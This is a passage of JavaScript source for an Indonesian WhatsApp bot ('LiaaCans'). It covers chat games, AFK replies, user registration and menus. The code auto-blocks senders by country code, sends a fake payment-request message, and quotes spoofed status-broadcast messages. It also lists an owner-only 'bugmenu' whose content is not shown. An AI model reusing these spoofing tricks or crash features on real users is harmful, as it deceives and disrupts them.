delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}
	    
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) await liaacans.sendText(room.x, str, m, { mentions: parseMention(str) } )
await liaacans.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
liaacans.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
liaacans.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) liaacans.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) liaacans.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) liaacans.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
liaacans.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) liaacans.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) liaacans.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
liaacans.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
	    
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}

if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

async function payment(jid, from, msg = { conversation: "Test" }, currency = "IDR", value = 5000) {
  const paymentTest = {
    amount: {
      currencyCode: currency,
      offset: 5000,
      value: value
    },
    expiryTimestamp: 0,
    amount1000: 10000 * 1000,
    currencyCodeIso4217: currency,
    requestFrom: from,
    noteMessage: msg
  }
  await liaacans.relayMessage(jid, { requestPaymentMessage: paymentTest }, {}) 
  return paymentTest
}
function randomNomor(min, max = null) {
		  if (max !== null) {
			min = Math.ceil(min);
			max = Math.floor(max);
			return Math.floor(Math.random() * (max - min + 1)) + min;
		  } else {
			return Math.floor(Math.random() * min) + 1
		  }
		}
function monospace(string) {
            return '```' + string + '```'
        }
function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = liaacans.sendMessage(m.chat, { text: teks, mentions: mems })
return res
} else {
let res = liaacans.sendMessage(m.chat, { text: teks, mentions: mems }, { quoted: m })
return res
}
}

let cekUser = (satu, dua) => { 
let x1 = false
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return db_user[x1].id }
if (satu == "name"){ return db_user[x1].name }
if (satu == "seri"){ return db_user[x1].seri }
if (satu == "premium"){ return db_prem[x1].seri }
}
if (x1 == false) { return null } 
}

let setUser = (satu, dua, tiga) => { 
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){
if (satu == "±id"){ 
db_user[i].id = tiga
fs.writeFileSync('./json/user.json', JSON.stringify(db_user))} 
if (satu == "±name"){ 
db_user[i].name = tiga 
fs.writeFileSync('./json/user.json', JSON.stringify(db_user))} 
if (satu == "±seri"){ 
db_user[i].seri = tiga 
fs.writeFileSync('./json/user.json', JSON.stringify(db_user))} 
if (satu == "±premium"){ 
db_prem[i].seri = tiga
fs.writeFileSync('./json/premium.json', JSON.stringify(db_prem))}
}})
}

global.addUserPanel = (email, username, expired, _db) => {
var obj_add = {
email: email,
username: username,
expired: expired
}
_db.push(obj_add)
fs.writeFileSync('./json/userpanel/user.json', JSON.stringify(_db, null, 3))
}

//TEMPLATE BUTTON!
		const buttonsDefault = [
			//{ callButton: { displayText: `Call Owner!`, phoneNumber: `+6285849261085` } },
			{ urlButton: { displayText: `github!`, url : `https://github.com/FebriansyahXd` } },
			{ quickReplyButton: { displayText: `🧑 owner`, id: `${prefix}owner` } },
			{ quickReplyButton: { displayText: `💰 donate`, id: `${prefix}donate` } },
			{ quickReplyButton: { displayText: `🗼 ping bot`, id: `${prefix}pingbot` } }
		]

//Auto Block Nomor Luar Negeri
if (m.sender.startsWith('212')) {
liaacans.updateBlockStatus(m.sender, 'block')
}
if (m.sender.startsWith('1')) {
liaacans.updateBlockStatus(m.sender, 'block')
}
if (m.sender.startsWith('237')) {
liaacans.updateBlockStatus(m.sender, 'block')
}
if (m.sender.startsWith('885')) {
liaacans.updateBlockStatus(m.sender, 'block')
}
if (m.sender.startsWith('880')) {
liaacans.updateBlockStatus(m.sender, 'block')
}
if (m.sender.startsWith('80')) {
liaacans.updateBlockStatus(m.sender, 'block')
}
if (m.sender.startsWith('60')) {
liaacans.updateBlockStatus(m.sender, 'block')
}

//Ku Sembunyikan AntiSpamnya Terganggu:v
/*if (isCmd && antiSpam.isFiltered(m.chat) && !m.isGroup) {
console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'm.chat', color(pushname))
return m.reply('Kamu terdeteksi spam bot tanpa jeda, lakukan perintah setelah 3 detik')
}
        
if (isCmd && antiSpam.isFiltered(m.chat) && m.isGroup) {
console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'm.chat', color(pushname), 'in', color(groupName))
return m.reply('Kamu terdeteksi spam bot tanpa jeda, lakukan perintah setelah 3 detik')
}

if (isCmd && !itsMe) antiSpam.addFilter(m.chat)*/

//Push command To Console
if (command) {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m LIAACANS \x1b[1;37m]', time, chalk.green(budy || m.mtype), 'Dari', chalk.blue(pushname), 'Di', chalk.yellow(groupName ? groupName : 'Private Chat' ), 'args :', chalk.white(args.length))
}
//━━━━━━━━━━━━━━━[ FITURNYA ]━━━━━━━━━━━━━━━━━//

switch(command) {
case 'verify': case 'daftar': case 'register':{
if (cekUser("id", m.sender) !== null) return m.reply('Kamu sudah terdaftar !!')
var res_us = `${makeid(10)}`
var user_name = `#GR${makeid(5)}`
var user_prem = `${isPremium ? 'Yes' : `No`}`
let object_user = {"id": m.sender, "name": user_name, "seri": res_us, "premium": user_prem }
db_user.push(object_user)
fs.writeFileSync('./json/user.json', JSON.stringify(db_user, 2, null))
mentions(`𝖬𝖾𝗆𝗎𝖺𝗍 𝖴𝗌𝖾𝗋 @${m.sender.split("@")[0]}`, [m.sender])
await sleep(1500)
var verify_teks =`───「 𝗧𝗘𝗥𝗩𝗘𝗥𝗜𝗙𝗜𝗞𝗔𝗦𝗜 」────

○ ID : @${m.sender.split('@')[0]}
○ Name : ${user_name}
○ Seri : ${res_us}
○ Status : ${user_prem}

silahkan ketik #rules
untuk membaca rules bot
`
await liaacans.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSV9oY3gT203Ee9YyNcj--APJouMxGnOkCj_A&usqp=CAU' }, caption: `${verify_teks}` }, { quoted: fkontak }, [m.sender])
var inimenu = await fs.readFileSync('./json/audio/daftardirianda.mp3')
liaacans.sendMessage(m.chat, {audio:inimenu, mimetype:'audio/mpeg', ptt:true}, {quoted: fvn})
}
break
case 'allmenu': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `BOT TELAH ONLINE : ${runtime(process.uptime())}`,jpegThumbnail: global.thumb}}}
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${menu(prefix, pushname, isPremium, ucapanWaktu, hariini, barat, tengah, timur)}` }, { quoted: kafloc })
            }
         break
case 'menu': case 'help': case 'command': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
var menu_teks = `Hai Kak ${pushname}
˗ˏˋ˖🐰*${ucapanWaktu}* ָ ⋆ 𖥻
▬▭▬▭▬▭▬▭▬▭▬▭▬ 
˗ˏˋ˖🧺 *Creator : Aulia Rahman CloudPedia*
˗ˏˋ˖🧺 *Lib : Baileys V.3.5.8*
˗ˏˋ˖🧺 *Total Fitur : 400+*
˗ˏˋ˖🧺 *Tanggal : ${hariini}*
˗ˏˋ˖🧺 *Pukul : ${jam}*
˗ˏˋ˖🧺 *Runtime Bot*
˗ˏˋ˖🧺 *${runtime(process.uptime())}*
˗ˏˋ˖🧺 *Prefix : 「 ${prefix} 」*
▬▭▬▭▬▭▬▭▬▭▬▭▬ 
┌─❖ ⌜ ˗ˏˋ˖🐰*USER INFO* ָ ⋆ 𖥻 ⌟
⌗ *Name* : *${pushname}*
⌗ *Status* : *${isCreator ? 'OWNER' : isPremium ? 'Premium' : 'Gratisan'}*
⌗ *Premium* : ${isPremium ? '✅' : `❌`}
└─❖

┌─❖ ⌜ 𝙄𝙉𝘿𝙊𝙉𝙀𝙎𝙄𝘼𝙉 𝙏𝙄𝙈𝙀 ⌟
├ *Hari Ini* : ${hariini}
├ *Wib* : ${barat} WIB
├ *Wita* : ${tengah} WITA
├ *Wit* : ${timur} WIT
└─❖

╔━❖ ⌜ MENU ADA DISINI ⌟
┃
┣ ❖ ${prefix}allmenu
┣ ❖ ${prefix}groupmenu
┣ ❖ ${prefix}funmenu
┣ ❖ ${prefix}anonymousmenu
┣ ❖ ${prefix}convertmenu
┣ ❖ ${prefix}bugmenu (khusus own)
┣ ❖ ${prefix}randommenu
┣ ❖ ${prefix}downloadmenu
┣ ❖ ${prefix}panelmenu
┣ ❖ ${prefix}databasemenu
┣ ❖ ${prefix}islamicmenu
┣ ❖ ${prefix}chargermenu
┣ ❖ ${prefix}soundmenu
┣ ❖ ${prefix}makermenu
┣ ❖ ${prefix}textpro
┣ ❖ ${prefix}mainmenu
┣ ❖ ${prefix}sistemmenu
┣ ❖ ${prefix}ownermenu
┃
╚━❖

╔━❖ ⌜ MENU LAINNYA ⌟
┃
┣ ❖ ${prefix}runtime
┣ ❖ ${prefix}ping
┣ ❖ ${prefix}pemilik
┃
╚━❖

╔━❖ ⌜ 𝗥𝗔𝗠𝗔𝗗𝗛𝗔𝗡 ⌟
┣ ${Ramadhan}
┃
╔━❖ ⌜ 𝙃𝘼𝙍𝙄 𝙍𝘼𝙔𝘼 ⌟
┣ ${harirayaif}
┃
┣━❖ ⌜ 𝗡𝗘𝗪 𝗬𝗘𝗔𝗥 ⌟
┣ ${tahunbaru}
┃
┣━❖ ⌜ 𝐔𝐋𝐓𝐀𝐇 𝐎𝐖𝐍𝐄𝐑 ⌟
┣ ${ultahown}
┃
╚━❖

⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
╞═══ 《 *THANKS TO* 》 ═══
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
🐰 𖦆 ۫  *Aulia Rahman*
🐰 𖦆 ۫  *Ubay*
🐰 𖦆 ۫  *Azzam*
🐰 𖦆 ۫  *Nurutomo*
🐰 𖦆 ۫  *Amel Cans*
🐰 𖦆 ۫  *Ronove*
🐰 𖦆 ۫  *Nanda*
🐰 𖦆 ۫  *Adiwajshing/Baileys*
🐰 𖦆𒀭ᥫ᭡ *「 Bot Whatsapp Verified 」* Ꮺ ָ࣪ ۰ .🐰 𖦆`
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${menu_teks}` }, { quoted: kafloc })
}
break
case 'funmenu': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${funMenu(prefix)}` }, { quoted: kafloc })
            }
            break
case 'panelmenu': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${panelMenu(prefix)}` }, { quoted: kafloc })
            }
            break
case 'groupmenu': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${gcMenu(prefix)}` }, { quoted: kafloc })
            }
            break
case 'convertmenu': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${convertMenu(prefix)}` }, { quoted: kafloc })
            }
            break
case 'randommenu': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
await liaacans.sendMessage(m.chat, { image: { url: 'https://c.top4top.io/p_2677wqyb81.jpg' }, caption: `${randomMenu(prefix)}` }, { quoted: kafloc })
            }
            break
case 'downloadmenu': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if(!isPremium)throw`Fitur Ini Khusus Untuk Premium`
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
            await liaacans.sendMessage(m.chat, { image: { url: 'https://b.top4top.io/p_2677yn3kd0.jpg' }, caption: `${downloadMenu(prefix)}` }, { quoted: kafloc })
            }
            break
case 'ownermenu': {
if(!isCreator)throw`Fitur Ini Khusus Untuk Owner`
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
            await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${ownerMenu(prefix)}` }, { quoted: kafloc })
            }
            break
case 'anonymousmenu': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${anonymousMenu(prefix)}` }, { quoted: kafloc })
            }
            break
case 'databasemenu': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${databaseMenu(prefix)}` }, { quoted: kafloc })
            }
            break
case 'islamicmenu': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${islamicMenu(prefix)}` }, { quoted: kafloc })
            }
            break
case 'chargermenu': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${chargerMenu(prefix)}` }, { quoted: kafloc })
            }
            break
case 'makermenu': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${makerMenu(prefix)}` }, { quoted: kafloc })
            }
            break
case 'bugmenu': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!isCreator) throw mess.owner
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${bugMenu(prefix)}` }, { quoted: kafloc })
            }
            break
case 'soundmenu': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!isPremium) throw mess.prem
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${soundMenu(prefix)}` }, { quoted: kafloc })
            }
            break
case 'sistemmenu': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!isPremium) throw mess.prem
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${sistemMenu(prefix)}` }, { quoted: kafloc })
            }
           break
case 'donasi': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
await liaacans.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQEWa7AX9wcJcJkQ52mdHZ-gYlwvB9S2dA00QiBM6KCnUicwj3U5gTpxag&s=10' }, caption: `${donasiMenu()}` }, { quoted: kafloc })
}
break
case 'mainmenu': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${mainMenu(prefix)}` }, { quoted: kafloc })
            }
break
case 'textpro': {
txtpro = `${textPro(prefix)}`
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${textPro(prefix)}` }, { quoted: kafloc })
            }
            break
case 'sc': case 'script': case 'sourcecode': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
source =`Mau Beli Sc Bot LiaaCans?\nCuman 50k Full All Fitur\n\nChat Whatsapp Owner\nhttps://wa.me/${global.nomorsc}`
await liaacans.sendMessage(m.chat, { image: { url: 'https://d.top4top.io/p_2677hm2mw0.jpg' }, caption: `${source}` }, { quoted: kafloc })
            }
break
case 'revoke': {
